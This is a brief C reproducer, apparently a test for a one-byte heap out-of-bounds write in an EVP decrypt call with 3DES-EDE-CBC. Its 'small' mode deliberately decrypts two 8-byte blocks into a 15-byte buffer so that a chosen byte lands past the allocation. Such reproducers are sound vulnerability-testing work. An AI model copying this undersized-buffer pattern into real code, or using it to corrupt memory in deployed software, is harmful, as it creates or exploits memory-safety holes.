/* W211: CVE-2026-134056 with an 8-byte block cipher (3DES-EDE-CBC).
 * Documented minimum for one 8-byte update is in_len + b - 1 = 15 bytes.
 * Two updates of 8 bytes write 16 bytes, so byte 15 is one past the minimum.
 * The chosen plaintext byte at pt[15] is 0x48. */
#include <openssl/cipher.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

static void die(const char *s) { fprintf(stderr, "FAIL %s\n", s); exit(2); }

int main(int argc, char **argv) {
  if (argc != 2) die("usage: des-oob small|large");
  int small = strcmp(argv[1], "small") == 0;
  const uint8_t key[24] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12,
                           13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24};
  uint8_t iv[8] = {0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};
  uint8_t pt[16], ct[24];
  for (int i = 0; i < 16; i++) {
    pt[i] = (uint8_t)(0x61 + i);
  }
  pt[15] = 0x48;

  int n = 0, nf = 0;
  EVP_CIPHER_CTX *e = EVP_CIPHER_CTX_new();
  if (e == NULL ||
      !EVP_EncryptInit_ex(e, EVP_des_ede3_cbc(), NULL, key, iv)) {
    die("encrypt init");
  }
  if (!EVP_EncryptUpdate(e, ct, &n, pt, 16) ||
      !EVP_EncryptFinal_ex(e, ct + n, &nf)) {
    die("encrypt");
  }
  n += nf;
  if (n != 24) {
    die("ciphertext length");
  }
  EVP_CIPHER_CTX_free(e);

  EVP_CIPHER_CTX *d = EVP_CIPHER_CTX_new();
  if (d == NULL ||
      !EVP_DecryptInit_ex(d, EVP_des_ede3_cbc(), NULL, key, iv)) {
    die("decrypt init");
  }
  int cap = small ? 15 : 32;
  uint8_t *out = malloc((size_t)cap);
  if (out == NULL) {
    die("malloc");
  }
  memset(out, 0xab, (size_t)cap);
  int n1 = -1, n2 = -1;
  if (!EVP_DecryptUpdate(d, out, &n1, ct, 8) ||
      !EVP_DecryptUpdate(d, out, &n2, ct + 8, 8)) {
    die("decrypt update");
  }
  /* Never read out[15] in the 15-byte case: that would be a probe-side OOB. */
  int probe = small ? cap - 1 : 15;
  printf("block_size=%u cap=%d n1=%d n2=%d probe=0x%02x result=OK\n",
         EVP_CIPHER_CTX_block_size(d), cap, n1, n2, out[probe]);
  EVP_CIPHER_CTX_free(d);
  free(out);
  return 0;
}
